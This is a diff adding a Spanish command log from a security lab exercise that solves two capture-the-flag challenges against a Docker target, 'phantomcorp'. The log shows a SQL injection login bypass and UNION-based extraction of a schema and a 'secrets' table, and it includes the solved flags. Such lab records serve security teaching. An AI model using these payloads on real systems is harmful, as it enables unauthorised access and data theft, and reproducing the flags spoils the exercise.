@@ -1,0 +1,73 @@
+# ==============================================================================
+# Bitácora de Comandos — Laboratorio 07 (Grupo 10)
+# Retos resueltos: R1 (SQLi Auth Bypass) y R2 (SQLi UNION)
+# Target: http://phantomcorp
+# Entorno: Docker (cyberlab-attacker -> cyberlab-phantomcorp)
+# ==============================================================================
+
+# --- Verificación inicial de conectividad ---
+curl -s -i http://phantomcorp/
+
+# --- RETO 1: SQLi - Bypass de Autenticación (POST /login) ---
+# 1. Inspección del formulario mediante GET /login (comprobación de método)
+curl -s -i http://phantomcorp/login
+
+# 2. Establecimiento de línea de base con credenciales inválidas (POST)
+curl -s -i -X POST http://phantomcorp/login \
+  --data-urlencode "user=admin" \
+  --data-urlencode "pass=credencial_invalida_control"
+
+# 3. Sondeo de caracteres de control y detección de errores sintácticos
+curl -s -i -X POST http://phantomcorp/login \
+  --data-urlencode "user='" \
+  --data-urlencode "pass=test"
+
+# 4. Explotación analítica: Neutralización del predicado de contraseña mediante comentario SQL
+curl -s -i -X POST http://phantomcorp/login \
+  --data-urlencode "user=admin' --" \
+  --data-urlencode "pass=dummy"
+
+# 5. Validación formal de la flag R1 en el sistema CTF
+./ctf submit 07 R1 'FLAG{sqli_auth_bypass}'
+
+
+# --- RETO 2: SQLi - Extracción de Datos con UNION (GET /buscar?q=) ---
+# 1. Establecimiento de línea de base con búsqueda estándar en el catálogo
+curl -s -i -G http://phantomcorp/buscar \
+  --data-urlencode "q=Router"
+
+# 2. Determinación del contexto sintáctico y forzado de error de delimitador
+curl -s -i -G http://phantomcorp/buscar \
+  --data-urlencode "q='"
+
+# 3. Comprobación de contexto de inyección (cierre de comilla y comentario)
+curl -s -i -G http://phantomcorp/buscar \
+  --data-urlencode "q=' OR '1'='1' --"
+
+# 4. Inferencia de dimensionalidad mediante cláusula ORDER BY
+curl -s -i -G http://phantomcorp/buscar \
+  --data-urlencode "q=' ORDER BY 1 --"
+
+curl -s -i -G http://phantomcorp/buscar \
+  --data-urlencode "q=' ORDER BY 2 --"
+
+curl -s -i -G http://phantomcorp/buscar \
+  --data-urlencode "q=' ORDER BY 3 --"
+
+# 5. Comprobación de compatibilidad de tipos y canal reflejado en las dos columnas
+curl -s -i -G http://phantomcorp/buscar \
+  --data-urlencode "q=NOEXISTE' UNION SELECT 'COLUMNA_UNO', 'COLUMNA_DOS' --"
+
+# 6. Descubrimiento de esquema y definición de tablas mediante sqlite_master
+curl -s -i -G http://phantomcorp/buscar \
+  --data-urlencode "q=NOEXISTE' UNION SELECT sql, '' FROM sqlite_master WHERE type='table' --"
+
+# 7. Explotación analítica con proyección explícita de columnas (clave, valor) de la tabla secrets
+curl -s -i -G http://phantomcorp/buscar \
+  --data-urlencode "q=NOEXISTE' UNION SELECT clave, valor FROM secrets --"
+
+# 8. Validación formal de la flag R2 en el sistema CTF
+./ctf submit 07 R2 'FLAG{sqli_union_dump}'
+
+# --- Estado consolidado del progreso ---
+./ctf status 07
